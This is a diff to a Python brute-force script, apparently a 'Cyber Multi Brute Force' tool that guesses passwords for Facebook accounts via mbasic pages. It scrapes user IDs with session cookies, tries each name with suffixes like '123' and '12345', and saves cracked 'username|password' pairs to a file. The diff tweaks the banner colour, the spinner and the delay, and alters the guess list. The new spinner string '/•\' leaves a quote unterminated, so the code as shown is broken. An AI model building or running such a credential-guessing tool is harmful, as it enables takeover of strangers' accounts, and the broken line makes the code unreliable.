@@ -127,7 +127,7 @@ def mbfv2():
     aink(" \x1b[90m╚═════════════════════════════════════════════════╝")
     time.sleep(0.1)
 
-    aink(" MBASIC MULTI PRENFLIX ")
+    aink(" \033[97mMBASIC MULTI PRENFLIX ")
     aink(" UTAMAKAN JANGAN SPAM ! ")
 
     aink("\033[97m╭╼[\033[93mCyber Multi Brute Force\033[97m]\033[97m─\033[97m[\033[93mPrenflix\033[97m]")
@@ -213,9 +213,9 @@ def mbfv2():
                                 f.write(username + '|' + password + '\n')
              else:
                    die += 1
-             for i in list('→↑↓←'):
+             for i in list('/•\'):
                             print(f"\r\033[00m [\033[1;91m{i}\033[00m] \033[97mProses : \033[90m[\033[1;92m{str(die)}\033[90m] \033[93mcheckpoint \033[91m: \033[90m[\033[1;93m{str(check)}\033[90m] \033[92mNow \033[91m: \033[90m[\033[1;92m{str(result)}\033[90m]\033[00m",end="")
-                            time.sleep(2.3)
+                            time.sleep(5.0)
          def getid(url):
              raw = requests.get(url,cookies=kuki).content
              getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
@@ -405,10 +405,10 @@ def mbfv2():
                                   ss = users[0].split(' ')
                                   for x in ss:
                                           listpass = [
+                                                  str(x) + '',
                                                   str(x) + '123',
                                                   str(x) + '1234',
                                                   str(x) + '12345',
-                                                  str(x) + '123456',
                                                   ]
                                           listpass.append(expass)
                                           for passw in set(listpass):
